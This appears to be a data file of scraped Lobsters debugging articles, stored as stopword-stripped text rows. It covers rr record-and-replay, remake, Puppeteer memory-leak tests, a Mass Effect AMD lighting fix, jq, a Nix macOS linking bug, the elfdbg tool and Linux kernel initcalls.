investigation hardware capability various microarchitectures would welcome issue looked rr found several large supercomputer run julia job similar issue since also llsc architecture well supporting hardware transactional memory theory believe hardware exists compensate issue preliminary investigation suggests hardware accurate enough support rr said understand active discussion ibm determine whether analysis correct one additional point complication experience quite common hypervisors used cloud vendor disable cpu capability required rr rendering incapable functioning inside virtual machine rr appears work fine latest generation amazon aws machine certain size google gcp microsoft azure lastly nt fail mention gpus gpus heavily utilized julia user currently supported rr changing tricky gpus often allow direct memory access device userspace program recorded interface gpu known definitely mitigated potentially performance cost eg double buffering gpus open source driver eg amdgpu active community interest building solution easy task think decent chance succeeding since open source driver allow insight exactly gpu work modify process memory gpus proprietary driver lot harder one interface userspace necessarily known additionally proprietary driver tend lot le well behaved open source one linux kernel review process tends filter egregious behavior example proprietary driver observed use userspace stack scratch space gpus use large number julia user hope work relevant vendor bring capability platform may long road summary new capability currently supported intel chip however bit chickenandegg problem hardware requirement nontrivial egregious hardware vendor cared problem could definitely build hardware enabled rr work really cared could build hardware assist feature make rr much faster without significant user base feature little incentive care hoping rolling capability widely incentive start presenting judging size community discounting use unsupported hardware operating system number user feature available likely number hundred thousand nt super large hardware vendor standard nt trivially small either hardware vendor interested making work happy talk mentioned already progress nature rr trace contain file touched process lifetime particular may contain thing like julia history process environment including secret may automatically adding bashrc similar configuration file system secret entered read ie make sure use sshagent reproducer involves using ssh authentication private code may using etc investigating building tooling help understand trace anonymize part trace potentially sensitive otherwise affect trace moment disable reading history default creating rr trace using history explicitly opted necessary reproduction nevertheless please make sure system administrator permission using bugreport feature sure recommend creating reproducer sanitized isolated environment eg docker container alternatively bugreport option creates public upload default user access professional julia support eg employer supercomputing center similar may able request mechanism share trace generated feature privately able replay trace beginning like say rr debugging becomes data analysis problem since answer question could possibly ask program already contained trace becomes question extracting answer default rr drop gdb gdb unlikely correct frontend analysis rr original author robert ocallahan startup working nextgeneration frontend http pernosco affiliation work made much possible plug least said julia tends pretty good tool data analysis idea frontend may look like notebook style ability generate plot time x space state recording lot cool thing done name checking assertion fact validating gc rooting accuracy fact performance analysis super precise coverage testing etc fact recording enables analysis technique would prohibitively expensive real time topic another time essentially company mentioned blog post past provided financial support julia project particular intel ibm past supported julia project financially improve support respective architecture amazon google microsoft provided cloud computing credit well intel google microsoft also previously sponsored juliacon work primarily funded employer julia computing part julia computing open source work funded external grant part work funded grant moore foundation gratefully acknowledged part work funded contract intel improve stability multithreading julia intel platform additionally hardware bug encountered work reported relevant vendor existing funded contract julia computing previously announced rr integration likely available future commercial offering separate piece work julia computing product interested using capability julia computing product julia computing support agreement please contact support representative lastly author discloses selfinterest spends much time trying get bug report reproduce rr fixed yall would swell
13,Lobsters,debugging,Debugging,Remake - GNU Make with comprehensible tracing and a debugger,http://bashdb.sourceforge.net/remake/,remake gnu make comprehensible tracing debugger,remake gnu make comprehensible tracing debugger python python gnu bash z shell korn shell perl nodejs excerpt example showing example showing short option example showing short option example showing kcachegrind source code video,remake gnu make comprehensible tracing debugger remake enahanced version gnu make add improved error reporting better tracing profiling debugger latest version based gnu make source although version available based also cool debugger python python gnu bash z shell korn shell perl nodejs excerpt example showing task example showing trace short option x example showing showparent short option c example showing profile output displayed via kcachegrind source code video
14,Lobsters,debugging,Debugging,Automatically detect memory leaks with Puppeteer,https://media-codings.com/articles/automatically-detect-memory-leaks-with-puppeteer,automatically detect memory leak puppeteer,bronley plumb skip right end standardizedaudiocontext puppeteer chrome devtools protocol pagemetrics comment github issue heapprofiler blog pagequeryobjects subtle bug andrey lushnikov countobjects function mocha hook memory leak test reported memory leak opensource project,half year ago bronley plumb kindly made aware memory leak one opensource package see memory leak action necessary open browser dev tool execute manual step top memory inspected manually complicated procedure normally add failing test fix bug time bit tricky end found way test memory consumption automatically came withif interested adventurous path led solution feel free skip right end read therein general memory leak situation software hold piece memory nt really need anymore javascript likely mean reference object somewhere totally forgot garbage collection impossible distinguish object still use forgotten somewherehistorically memory leak something web developer care every link page caused new page loaded turn wiped memory memory leak usually shy become noticeable particular program keep running long timewith today single page application progressive web apps situation changed many website behave like apps designed run long time particularly true apps use web audio api memory leak question found standardizedaudiocontext library achieve cross browser compatibility apithe simple example memory leak could think attaching metadata object let say couple object want store metadata nt want set property object want keep metadata separate placethis solved using map shown following snippet allows store metadata get back delete needed map us object key index metadataconst map new map mapset obj metadata mapget obj mapdelete obj object metadata referenced anywhere else anymore still ca nt garbage collected map still reference index metadatathe following example course contrived many memory leak reduced something simple thisconst map new map setinterval const obj mapset obj metadata created object survive every garbage collection map still reference perfect use case weakmap reference held weakmap prevent object garbage collectedconst map new weakmap setinterval const obj mapset obj metadata replacing map weakmap common cause memory leak eliminated problem caused memory leak code similar although obvious spotpuppeteer tool used remote control chrome chromium browser simpler alternative selenium webdriver downside work browser based chromium come access apis accessible selenium try interact website like real user puppeteer hand access many apis accessible normal user work utilizing chrome devtools protocol one thing puppeteer selenium ca nt inspecting memory course super helpful trying find memory leaksat first glance seems function api puppeteer offer needed track memory usage pagemetrics method among thing also return metric called jsheapusedsize number byte javascript engine used chrome us memoryconst jsheapusedsize await pagemetrics unfortunately getting size memory enough memory javascript program managed autonomous garbage collection unlike garbage collection real world usually show strict well known schedule javascript garbage collection job whenever think right time normally triggered within javascript code necessary make sure ran inspecting memory sure trash picked memory consumption computed based latest change made codehowever puppeteer least version dedicated method trigger garbage collection according comment github issue fairly easy implement author suggests use internal devtools client interact heapprofiler directlyconst client await pagetarget createcdpsession await clientsend heapprofilerenable await clientsend heapprofilercollectgarbage await clientsend heapprofilerdisable interacting raw devtools client course bit fragile puppeteer maintains api nt give guarantee keeping devtools protocol consistent functionality heapprofiler still marked experimental may changed even removed time using hack robust solutionbesides fragile hack also able get consistent result executing three command therefore tried different way trigger garbage collectionwhen taking snapshot heap garbage collection triggered implicitly tried programmatically create snapshot shown following snippetconst client await pagetarget createcdpsession await new promise resolve const resolvepromise finished finished clientoff heapprofilerreportheapsnapshotprogress resolvepromise resolve clienton heapprofilerreportheapsnapshotprogress resolvepromise clientsend heapprofilertakeheapsnapshot reportprogress true nt work sure call garbage collection nt producing consistent result expectedi went try something different according stack overflow answer possible specify flag launching puppeteer one flag meant tell expose garbage collectionawait puppeteerlaunch args jsflags exposegc possible call magic gc function attached global window objectawait pageevaluate gc feel le hacky using internal devtools protocol client puppeteer nt able get consistent resultsi wondered result test varied much even using simple code snippet memory usage different changed one parameter test caseafter time occured memory usage seemed depend number iteration ran make sure nt memory leak executed piece code several time expectation memory consumption remain unchanged word memory consumption executing code piece code testing ran completionbut relationship memory usage number iteration however linear relationship one would expect case actual memory leak number memory increased others remained almost stable even others shrinked concluded might testing something least one level deep well every javascript engine complex try optimize code execute much possible team example blog post regular article new optimization applyif create object javascript guarantee much memory using browser javascript engine may choose store extremely memory efficient way first use heavily browser might decide switch alternative version consumes space machine much faster access know think exactly problem ran memory consumption changed depending number time ran code wanted inspect sometimes optimized code different way turn change memory footprint store state inside memory javascript object make size memory even le predictable would option study internals compensate optimization measuring memory optimization get refined regularly would make test brittle rely thatbut even could manage make sense number returned pagemetrics another problem would make test flaky puppeteer operating asynchronously use two separate method collect garbage measure memory ca nt sure nothing happened two function thus absolutely possible memory allocated meantime corrupts result returned pagegetmetrics luckily puppeteer offer simpler better way one go provides method query object given prototype called pagequeryobjects shown following function take prototype count object prototype somewhere prototype chain case used objectprototype javascript almost everything inherits notable exception rule object created without prototype using objectcreate null primitive valuesconst countobjects async page const prototype await pageevaluatehandle return objectprototype const instance await pagequeryobjects prototype const numberofobjects await pageevaluate instance instanceslength handle await prototypedispose await instancesdispose return numberofobjects technique independent number byte object occupy heap count number think least good start testing memory leak javascript codefinally found way get consistent result best thing also trigger garbage collection internally counting object way nt use one hacky solution mentioned aboveup version subtle bug puppeteer thankfully fixed andrey lushnikov many thanks back using countobjects function really work expected case anymore using puppeteer version onwardsi personally prefer mocha running test setup testing library fairly similar many testing library mocha provides hook triggered test used launch browser puppeteer close test donedescribe memory leak test let browser let context let page async browser await puppeteerlaunch beforeeach async context await browser createincognitobrowsercontext page await contextnewpage aftereach contextclose browserclose code launch browser first test close last test addition creates new context page every single test also close context testwith boilerplate place use countobjects function write actual memory leak test like memory leak async const numberofobjects await countobjects page await pageevaluate expect await countobjects page toequal numberofobjects finally solution test memory leak automated wayin case interested feel free explore memory leak test wrote standardizedaudiocontext library make sure reported memory leak never come backif encounter bug opensource project please report often start project part work client maintenance usually done free time reason sometimes take little longer fix bug even take half year comitted fix bug find
18,Lobsters,debugging,Debugging,Fixing Mass Effect black blobs on modern AMD CPUs,https://cookieplmonster.github.io/2020/07/19/silentpatch-mass-effect/,fixing mass effect black blob modern amd cpu,download introduction mass effect disabling lighting via console command modifying game map remove broken light processor instruction set part research prelude rafael rivera psgp rafael rivera guide enabling applicationspecific flag pix capture carry bug similar looking issue come straight unreal engine part closer look part standalone test intel amd intel amd directxmath work fine intel amd part putting together silentpatch mass effect download download silentpatch mass effect setup instruction see source github,tl dr interested indepth overview wrong game fixed scroll download section download link introduction mass effect popular franchise scifi roleplaying game first game initially released bioware late xbox exclusively part publishing deal microsoft month later game received pc port developed demiurge studio decent port obvious flaw amd released new bulldozerbased cpu playing game pc modern amd processor two area game noveria ilo show severe graphical artifact well nt look nice unplayable definitely distracting thankfully workarounds exist disabling lighting via console command modifying game map remove broken light seemingly issue never fully understood source claim fps counter mod also fix issue find much information mod source seem available online documentation mod tackle error make issue particularly interesting vendorspecific bug nothing new game decade however best knowledge case graphical issue caused processor graphic card majority case issue happen specific vendor gpu care cpu case exact opposite make issue unique worth looking looking existing discussion online issue seems affect amd fx ryzen chip compared older amd chip lack instruction set unrelated community consensus cause bug game tried use instruction upon detecting amd cpu given known case bug occurring intel cpu instruction exclusive amd surprise community assumed issue really issue caused something entirely different let find part research prelude even though issue trivial reproduce look longest time simple reason access pc amd hardware thankfully time approaching research alone rafael rivera got back entire process r providing test environment amd chip insight idea well putting hundred blind guess usually throw around trying find way root unknown problem since good testing environment first theory test course cpuid people right assuming instruction blame place game code check presence least check cpu vendor reasoning flawed though true game attempt use instruction time run amd chip without checking supported game would likely crash trying execute illegal instruction moreover quick scan around game code reveals game check cpu capability therefore whatever issue appear caused game misdetecting cpu feature seemingly care first place started looking like undebuggable case rafael came back realization disabling psgp processor specific graphic pipeline fix issue character properly lit psgp best documented term short legacy concerning older directx version feature allowing perform processorspecific optimization previous version directx path allowed vertex processing called psgp application take path account support path vertex processing processor graphic core putting way make sense disabling psgp fix artifact amd path taken modern amd processor may somehow broken disable two way come mind possible pas flag createdevice defined restrict computation main application thread flag set runtime may perform software vertex processing computation worker thread improve performance multiprocessor system sadly setting flag fix issue look like despite flag psgp name looking directx specifies two registry entry disable psgp disable psgp disablepsgp flag set systemwide processwide information set specific process see rafael rivera guide enabling applicationspecific flag appears viable fix issue therefore aversion towards downloading third party fixesmodifications must fix issue without making change game perfectly fine way long set flag mass effect systemwide fine pix always graphical issue pix likely useful tool one could use diagnose captured similar scene intel amd hardware compared result one difference instantly noticeable unlike past project capture carry bug capture would look different different pc indicating driver bug capture carry bug word capture amd hardware opened pc intel hardware show bug amd capture intel look different hardware taken tell u since pix take screenshots instead capture sequence command executes hardware observe executing command captured amd box result bug executed intel strongly implies difference caused difference command executed get gpu specific bug command executed word almost certainly sort driver bug instead way input gpu prepared seems somehow broken indeed rare occurrence point finding bug matter finding jarring difference capture tedious viable way long spent poking capture full body draw call caught attention intel capture draw output character body together lighting texture amd capture output plain black model look like good trail first obvious candidate checking would bound texture seem fine consistent across capture however pixel shader constant looked weird nan number also seem appear amd capture intel capture qo indicates nan look promising nan value causing strange visuals unheard funnily enough playstation version mass effect similar looking issue also related nan however get excited value could leftover previous draw might end unused current draw luckily case clearly visible nan get submitted specific setvertexshaderconstantf setvertexshaderconstantf setpixelshaderconstantf submits constant setpixelshaderconstantf submits constant setrenderstate setrenderstate setrenderstate setrenderstate testcooperativelevel setindices drawindexedprimitive draw character model pixel shader used draw reference constant register name reg size upperskycolor lowerskycolor constant appear come straight unreal engine judging name might directly influence lighting bingo quick ingame test confirms theory intel machine vector nan value never submitted pixel shader constant meanwhile amd machine nan would start showing soon player entered area lighting break mean work done far finding broken constant half success question remains come replaced ingame test replacing nan value zero partially fixed issue ugly black blob disappeared character still way dark almost correct quite given important light value might scene feasible settle workaround like know right track though sadly attempt track origin constant pointed towards something resembling render thread real place submission undebuggable clear needed try fresh approach potentially spending infinite amount time following data flow gamespecific andor structure part closer look taking step back realized overlooked something earlier recall fix issue one two registry entry added disablepsgp assuming naming misleading subset disablepsgp former disabling psgp latter disabling assumption turned sight mass effect import set function linking looking list approached without prior knowledge gained capture would expected possible culprit shaders could wrongly optimized andor compiled amd fixing could insanely challenging however current knowledge one function stand list function could reasonably used prepare pixel shader constant function called one place game int thiscall invertmatrix void int return well made though quick peek inside reveals touch output parameter return nullptr matrix inversion fails due input matrix singular yet game care output matrix might left uninitialized boo inverting singular matrix indeed happen game frequently main menu matter attempt make game handle better eg zeroing output setting identity matrix visuals change oh well theory debunked back psgp psgp exactly rafael rivera looked logic behind turn quite simple addfunctions disablepsgp optimization turned else isprocessorfeaturepresent getfeatureflags mmx getfeatureflags addfunctions getfeatureflags addfunctions getfeatureflags sse addfunctions amdsse else isprocessorfeaturepresent addfunctions else isprocessorfeaturepresent pfxmmiinstructionsavailable sse addfunctions intelsse unless psgp disabled pick function optimized make use specific instruction set make sense tie back original theory turn function optimized amd instruction set game indirectly making use instruction removed modern amd processor take code path intel processor summarize disabling psgp make intel amd take regular code path intel cpu always take code path amd cpu supporting take code path cpu without take code path information put forward hypothesis something possibly wrong amd instruction result matrix inversion calculated amd path either inaccurate completely incorrect verify hypothesis test course p may thinking well game us newest library surely must fixed later revision tried verify upgrading game link newest dll nothing changed part standalone test prepared simple standalone program verify precision matrix inversion short game session bugged game area recorded every input output file later file read standalone test program result recalculated verify correctness output game compared output calculated test program several attempt basing data collected intel amd chip psgp enableddisabled crosschecked result machine result follows indicating success result equal indicating failure result equal last column indicates whether game handle data fine glitch deliberately take imprecision floatingpoint math account instead compared result memcmp data source intel amd intel amd accepted game intel amd intel amd test result interesting result show calculation transfer across intel amd machine calculation without transfer across machine calculation without accepted game despite identical one intel raise question exactly wrong calculation amd end glitching game precise answer seems product two factor implementation might poor numerically seems like instruction give different result intelamd possibly different rounding mode function written way would help mitigate inaccuracy game code written way sensitive accuracy issue point ready put forward fix would replace rewrite variation function call day however proceeding one random idea deprecated got replaced directxmath figured since replace matrix function anyway could try replacing xmmatrixinverse modern replacement xmmatrixinverse also us instruction equally optimal function nearly sure would break way hacked together quickly sent rafael work fine sure issue coming tiny difference instruction may purely numerical issue despite also using xmmatrixinverse gave perfect result intel amd therefore reran test result surprising say least data source intel amd accepted game intel amd test result xmmatrixinverse game work fine result perfectly identical transfer across machine mind revised theory behind bug without doubt game fault sensitive issue additional test seems like may written fast math mind directxmath may care precise calculation make sense product perfectly reasonable written performance main priority directxmath luxury engineered later could put attention towards precise deterministic computation part putting together took get hope still bored death summarize went verified game use instruction directly system dlls found disabling psgp fix issue amd processor using pix found culprit nan value pixel shader constant nailed origin value fuzzed function found give consistent result intel amd cpu instruction used accidentally found xmmatrixinverse flaw viable replacement thing left implement proper replacement silentpatch mass effect appears decided cleanest way fix issue provide replacement forward every function exported mass effect system dll except function developed replacement using xmmatrixinverse replacement dll make clean bulletproof installation confirmed work fine origin steam version game work box without need asi loader third party software best knowledge game look exactly without downgrade lighting noveria ilo download modification downloaded mod patch click head game page directly download silentpatch mass effect downloading need extract archive game directory sure proceed check setup instruction interested full source code mod published github freely used point reference see source github
19,Lobsters,debugging,Debugging,Mastering JQ: Part 1,https://codefaster.substack.com/p/mastering-jq-part-1-59c,mastering jq part,jq pretty print json debug eyeball select json data transform json data jq manual array filter length reverse add map map map select filter flatten array constructor object filter key toentries fromentries object constructor transform newline delimited data multiple result reading multiple value pretty printing multiple result jq aka slurp jq r aka raw string output jq r aka raw string input jq aka antislurp reading newline delimited data writing newline delimited data conclusion,first part ongoing series mastering jq series assume prior experience jq assume basic fluency shell programmingjq valuable tool every fast coder tool chest contains depth immense power part start basicsfor application jq lead example copy paste shell see work rest section discus application detailpretty print jsonecho jq one valuable application jq also easiest use pretty printing jsonpass desired json stdin jq print pretty print json stdout jq pretty printing add shape color data shape color make data much faster read debug discussed debug eyeball one caveat jq render color jq output piped another command file example echo string jq json data large pipe le r render color properly echo string jq le rhowever notice color get color back use jq c flagecho string jq c le rselect json dataecho jq pretty print json data make easier read like go one step see relevant data jq yes jq select json data pretty print understand select relevant data need understand jq work little bitjq run following algorithmparse json value stdin set initial resultfor function apply function result set output result next functionthe final result pretty printed stdoutlet run example see jq performs selectionecho jq initial result jq applies selector result jq applies selector result jq applies selector result jq applies selector result final result therefore pretty printed stdout selector find useful identity selector return whole value jq pretty print whole value passed stdin key key string result isa json object key present return object key value json object key present return nullnot object jq return error keywithspecialcharacters like key work even string contains special character n n number result json array nth element present return nth elementa json array nth element present return nullnot array jq return error n n numberslet l length result array applicable result json array l subarray returneda json array n l subarray n l returneda json array l n empty array returnedif result array jq return error equivalent n equivalent n l l length arraytransform json dataecho n bob v n jim v jq map name n value v sometimes data want see suboptimal structure viewing want select want transform structure selector special case filter jq rich powerful collection filter transform data jq manual specifies different filter transform json data highlighted filter find useful along example run shell read jq manualarray filterslengthecho jq lengthgets length arrayreverseecho jq reversereverses arrayaddecho jq addsums element arraymapecho jq map map map functional programmingmap selectecho jq map select map select filter functional programmingflattenecho jq flattenflatten flatten functional programming flattens list list single listarray constructorecho jq using make array manuallyobject filterskeysecho jq keysreturns array key object especially useful object big key determined looking datatoentriesecho jq toentries toentries turn object array key value pairsfromentriesecho key value key value jq fromentries fromentries inverse toentries turn array key value pair objectobject constructorecho jq using make objectstransform newline delimited dataseq jq addso far used jq json data data format use jq well jq built support newline delimited data let start thereto use jq newline data need understand jq handle multiple resultsmultiple resultsi lied earlier said jq applies filter single json result actually multiple json result jq applies filter result independently pass result next filterreading multiple valuesmultiple value passed jq delimiting value whitespace including newline technically case delimiter needed value impact discussionpretty printing multiple resultsfor every final result jq print stdout newline delimitedto use jq newline data also need know jq flag one jq filterjq aka slurp echo jq jq read stdin multiple value combine single array practice use combine newline delimited result single resultjq r aka raw string output compareecho jq f return f toecho jq r f returnsfthe quoted f json string unquoted f raw string jq r pretty print result type string quoted json string raw stringjq r aka raw string input echo string jq r jq r interprets stdin json string delimited newlinesjq aka antislurp echo jq filter take array result split multiple resultswith ready handle newline delimited datareading newline delimited dataif input newline delimited number saw example use slurp seq jq data newline delimited string also need use raw string input however use slurp raw string input together jq par entire input single raw string need call jq twice quote string second time slurp single arrayecho e stringnstring jq r jq writing newline delimited datato output array number newline delimited number use antislurp echo jq output array string newline delimited string also need use raw string output echo jq r b c conclusionthis concludes first step mastering jq far seen jq pretty print jsonselect json datatransform jsontransform newline dataall way using jq discussed jq manual readily available easy find future installment dig deeper uncover hidden power jq power discussed manual want miss click subscribe button
20,Lobsters,debugging,Debugging,Debugging a dynamic linking bug in a Nix project,https://www.johnbcoughlin.com/posts/nix-dynamic-linking/,debugging dynamic linking bug nix project,debugging dynamic linking bug nix project trying nix development experience scientific project nix direnv wrapping c compiler override default petsc derivation nix pill whither linker edit keep filed ticket section installname depravity section helpful blog post gotcha petsc derivation line post epilogue first contribution,debugging dynamic linking bug nix project trying nix development experience day building scientific project contributor ran nasty version conflict two system library fit pique decided learn enough nix able set reproducible tightly controlled local build done overall happy tooling setup using direnv tightly integrate normal shell nix nixshell feature part everything feel seamless extremely refreshing see cmake report found plethora binary library contenthashed installed neat little row nixstore using nix manage development environment build project nix ensures project dependency installed discoverable compiler linker building project done cmake set cmake find nixinstalled library nix achieves wrapping c compiler shell script injecting path library binary via environment variable little make cmake work beyond declaring package want buildinputs first version shellnix file looked like file shellnix pkgs import nixpkgs pkgsmkshell buildinputs pkgs cmake callpackage nixpetscnix metis openmpi package packagesnumpy using setup little trouble getting project build override default petsc derivation compile metis openmpi support hard file nixpetscnix petsc blas gfortran lapack python metis openmpi petscoverrideattrs oldattrs rec nativebuildinputs blas gfortran gfortrancclib lapack python openmpi metis preconfigure export fc gfortran bingfortran gfortran bingfortran patchshebangs configureflagsarray configureflagsarray withmpidir openmpi withmetis metis withblaslib blas liblibblasso gfortrancclib liblibgfortrana withlapacklib lapack libliblapackso gfortrancclib liblibgfortrana nix file return function invoked shellnix using callpackage function petscoverrideattrs neat way override attribute derivation created stdenvmkderivation building petsc mpi metis support simple passing different set argument configure script figuring fun mostly referred nix pill great progression nix tool language nix file able execute cmake make successfully getting project run another story final binary failed immediately dynamic loading error binwarpxm dyld library loaded referenced usersjacksrcwarpxmbuildbinwarpxm reason image found binary trying load dynamic lib one temporary directory nix created process building petsc course failed time invoked binwarpxm directory cleaned instead file privatetmp binary linked result petsc derivation nix store nixstore point seemed environment variable incorrectly set intermediate directory figure would learn lot linking o x ever expected whither linker first checked compiler linker flag inserted nix compiler wrapper come via nixcflagscompile nixldflags working nixshell direnv environment variable derivation injected shell simple matter echoing echo nixcflagscompile isystem echo nixldflags look fine invoking cmake make shell ought pull correct library remembered project us pkgconfig find pull together linked library frankly understand pkgconfig well know project invoked inside cmake search library according rule run nix done job setting everything therefore circumvents compiler linker flag checked happened pkgconfig installed setting nix environment therefore cmake able invoke system pkgconfig user path perhaps system version pkgconfig somehow finding wrong library indeed echo pkgconfigpath confirmed searching directory home thought possible wire got crossed adding dependency nix derivation one time configuring pkgconfig appropriately might help edit since tried pure shell clean path removed something bashrc nixshell source might cause common belief nixshell isolated user installed passing pure flag wrong fact keep user whole path around filed ticket address however using nixshell believe super useful tool even without hermetically isolating development environment referred nix wiki page c project also section using pkgconfig seems including pkgconfig derivation nativebuildinput let package like petsc append output path pkgconfigpath environment variable pkgsmkshell buildinputs pkgs nativebuildinputs pkgs pkgconfig fix problem would go deeper track bad library pulled digging cmake documentation project cmake file led insert trio print statement findpackage pkgconfig required pkgcheckmodules petsc petsc required linkdirectories petsclibrarydirs message petsc library petsclibraries message petsc library dirs petsclibrarydirs message petsc link library petsclinklibraries list append warpxmlinktargets petsclibraries printed three line cmake output petsc library petsc petsc library dirs petsc link library second two look good first library name petsc little implicit comfort precisely variable appended link target list compile time would linker find library petsc sure would look safer use absolute path dylib like list append warpxmlinktargets petsclibraries list append warpxmlinktargets petsclinklibraries thinking wrong sure linker look compile time path listed nixldflags thinking clearly flow data compilation process changing link target absolute path eased mind duration next cmake make cycle surely way linker could screw arcane library search involved absolute path possibly binwarpxm dyld library loaded referenced usersjacksrcwarpxmbuildbinwarpxm reason image found damn installname depravity point absolutely flummoxed every fix attempted grepped vainly offending privatetmp path build directory come emptyhanded tracked final irrevocable link option passed compiler tucked away linktxt file build tree showed incontrovertibly binary linked correct library cat buildsrccmakefileswarpxmdirlinktxt applicationsxcodeappcontentsdevelopertoolchainsxcodedefaultxctoolchainusrbinc dndebug isysroot proved nearly satisfaction cmake right thing library completely idea finally lucky google search led section nix manual describing issue specific darwin macos platform state darwin library linked using absolute path library resolved installname link time sometimes package set correctly causing library lookup fail runtime fixed adding extra linker flag running installnametool id fixupphase matteroffact way stating something understood flabbergasted best understanding happens macos source code include directive include petsch something like creates binary interface satisfied linker link time pas list absolute path library linker find one match interface linker save installname library found binary load section run time binary actually macos dyld system load library installname look certainly gotten aspect wrong would definitely appreciate hearing someone understands better case find pointed concept installname something go searching led helpful blog post describing exactly issue facing also described check installname library otool gotcha nix manual state package set correctly point fix use installnametool change installname built library petsc derivation nixpkgs correctly saw something installnametool prepatch substituteinplace configure replace binsh usrbinpython stdenvliboptionalstring stdenvisdarwin substituteinplace configinstallpy replace usrbininstallnametool installnametool directive replaces appearance string usrbininstallnametool installnametool reason nix package ensure build rely nixbuilt tool provided build shell path binary system directory like usrbin pr introduced substitution indicates fixed build darwin must invocation usrbininstallnametool petsc searching petsc repo lead line exactly mark log post installname instructed change installname absolute path library installation directory using installnametool id ospathsplitext dst dylib ospathisfile usrbininstallnametool output err flg selfexecuteshellcommand otool src oldname output outputfind n installname oldnamereplace ospathrealpath selfarchdir selfinstalldir selfexecuteshellcommand usrbininstallnametool id installname dst according installname library repaired petsc library built notice something second condition statement petsc derivation run prepatch step condition become ospathisfile installnametool certainly fail installnametool going file directory configure running patched configure script silently skip step leaving installname library temporary directory built luckily solution problem hard instead name program path pas absolute path program want run done overriding prepatch step like prepatch substituteinplace configure replace binsh usrbinpython stdenvliboptionalstring stdenvisdarwin substituteinplace configinstallpy replace usrbininstallnametool darwincctools bininstallnametool nix variable darwincctools expand full path built darwincctools derivation directory nixstore patched statement inside petsc configurepy becomes ospathsplitext dst dylib ospathisfile use installnametool installname resulting library correct check otool otool looking much better since error dynamically loaded library even recompile check working build git master binwarpxm dyld loaded usersjacksrcwarpxmbuildbinwarpxm dyld loaded dyld loaded dyld loaded dyld loaded like epilogue spent time debugging problem without working understanding different build phase clear neither cmake pkgconfig setup could cause time invoking cmake offending privatetmp directory long vanished focused exclusively petsc derivation provided nix might homed installnametool patch little sooner went lucky find note nix manual darwinspecific linker problem nix absolutely using remarkable little impact able use manage environment project without impacting way developer manage environment course asked would advocate try nix nice everyone able time also looking forward first contribution nix
21,Lobsters,debugging,Debugging,Utility to determine if ELF binary is built with debug sections,https://github.com/sbz/elfdbg,utility determine elf binary built debug section,elfdbg debug section elf elf usage build install test kyua kyuafile history,elfdbg project elfdbg utility program quickly identify elf binary built debug section debug section elf binary usually generated using g flag compiler compiler add new debug section binary program looking existence section name starting debug determine binary built debug information elf format wellknown standard elf ti reference specification available freebsd elf man page usage intented used shell script order avoid using file parsing output like file pathtobinary awk debuginfo print elf determine binary built debug use following elfdbg q pathtobinary echo symbol else echo binary debug symbol fi freebsd easily identify binary package missing debug using similar oneliner pkg info lgrep localbinwhile read echo elfdbg done build install makefile use standard bsd makefile build program make sudo make install linux use make f gnumakefile specify gnu makefile test test case implemented using freebsd test suite framework kyua kyuafile make test history wrote using libelf elf gelf api rewrote without relying libelf api
22,Lobsters,debugging,Debugging,An introduction to Linux kernel initcalls,https://www.collabora.com/news-and-blog/blog/2020/07/14/introduction-to-linux-kernel-initcalls/,introduction linux kernel initcalls,tracing support purpose usage elf section level corkami example moduleinit debugging introduced really nice video steven rostedt implementation postcore conclusion stage definition debug id level resource,initcalls serve call function boot implemented early development linux kernel required significant change since version released around tracing support added steven rostedt useful measure time spent initcall allow debugging read take closer look initcalls including purpose linux kernel usage create function call one definition way debug using initcalldebug ftrace well short overview implementation purpose usage mentioned purpose initcalls call function different stage boot process used many architecture driver git grep initcall driver arch wc l initcalls defined regular function init attribute one helper define type initcall want use list initcalls distribution code implementation explained next part blog post keep mind main idea behind initcalls using initcalls create elf section object file programmer creates needed function go specific section section iterated later kernel execute function located section corresponds one initcall level familiar elf extensible linking format file format see nice overview corkami example example initcall executed postcore stage static int init mypostcoreinit void return postcoreinitcall mypostcoreinit find many realworld example kernel instance proc filesystem entry creation kernel debug symbol atic int init kallsymsinit void proccreate kallsyms null kallsymsprocops return deviceinitcall kallsymsinit using initcalls implies benefit code modular maintainable nt need explicitly pas store call function pointer instead mark function appropriate level initcall automagically invoked appropriate time however knowing one used difficult distinguish level name reflects order initcall part initcall called understand dependency function executed sometimes using initcall necessary using moduleinit enough notice initcalls function used builtin module module also loadable moduleinit key moduleinit initcalls executed early stage initialization module one statically linked kernel module loadable builtin many module builtin loadable nt need executed early necessary device become usable example case use one last initcalls level moduleinit thanks save time consumed bootup let important probing function executed earlier module compiled builtin configuration moduleinit function called doinitcalls function simple link deviceinitcall function ie one last initcalls boot process code includelinuxmoduleh ifndef module define moduleinit x initcall x define moduleexit x exitcall x initcall calling deviceinitcall git grep initcall includelinux includelinuxinith define initcall fn deviceinitcall fn includelinuxmoduleh define moduleinit x initcall x case loadable module insertion time using syscalls initcalls function replaced moduleinit one else module define earlyinitcall fn moduleinit fn define coreinitcall fn moduleinit fn define postcoreinitcall fn moduleinit fn define archinitcall fn moduleinit fn define subsysinitcall fn moduleinit fn define fsinitcall fn moduleinit fn define rootfsinitcall fn moduleinit fn define deviceinitcall fn moduleinit fn define lateinitcall fn moduleinit fn define consoleinitcall fn moduleinit fn see use case second article go deeper moduleinit implementation summarize nt reason execute function early stage booting process use moduleinit module loaded case noncore driver debugging debug commandline parameter exists print message executing initcalls function use initcalldebug introduced commandline calling initcall returned usecs calling initcall returned usecs calling vfp support implementor architecture part variant rev initcall returned usecs calling initcall returned usecs calling initcall returned usecs calling initcall returned usecs calling initcall returned usecs calling initcall returned usecs calling initcall returned usecs calling initcall returned usecs calling initcall returned usecs calling initcall returned usecs great debug parameter detect initcalls taking much time particularly case boottime improvement however debug log directly printed console printing message initcalls difficult retrieve particular information verbose log without great binary grep ftrace introducted initcalls familiar ftrace really nice video steven rostedt little example use case initcallstracing available event retrieved using debugfs entry mount debugfs nodev syskerneldebug cat syskerneldebugtracingavailableevents grep initcall initcall initcallfinish initcall initcallstart initcall initcalllevel familiar ftracing using initcalls little different need configure boot process add parameter commandline configure event want retrieve example commandline retrieve initcalllevel initcallstart initcallfinish event cat proccmdline earlyprintk rootwait traceeventinitcall initcalllevel initcall initcallstart initcall initcallfinish retrieve current event trace entry debugfs mount debugfs nodev syskerneldebug cat syskerneldebugtracingtrace tracer nop entriesinbufferentrieswritten irqsoff needresched hardirqsoftirq preemptdepth delay taskpid cpu timestamp function initcalllevel levelconsole initcallstart initcallfinish initcallstart initcallfinish initcalllevel levelearly initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish 